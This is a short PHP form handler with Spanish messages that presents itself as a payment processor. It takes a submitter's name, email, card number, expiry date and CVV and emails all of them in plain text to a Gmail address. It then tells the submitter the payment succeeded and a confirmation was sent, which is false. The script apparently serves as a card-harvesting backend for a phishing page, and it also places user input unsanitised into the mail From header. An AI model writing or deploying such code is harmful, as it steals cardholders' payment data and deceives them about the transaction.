<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $expiry = htmlspecialchars($_POST['expiry']);
    $cvv = htmlspecialchars($_POST['cvv']);

    $to = "espanajuegosplay2025@gmail.com"; // Tu dirección de correo electrónico
    $subject = "Nuevo Pago Recibido";
    $body = "Nombre: $name\nCorreo: $email\nNúmero de Tarjeta: $cardNumber\nFecha de Expiración: $expiry\nCVV: $cvv";
    $headers = "From: $email";

    if (mail($to, $subject, $body, $headers)) {
        echo "Pago procesado con éxito. Te hemos enviado un correo de confirmación.";
    } else {
        echo "Error al procesar el pago.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>
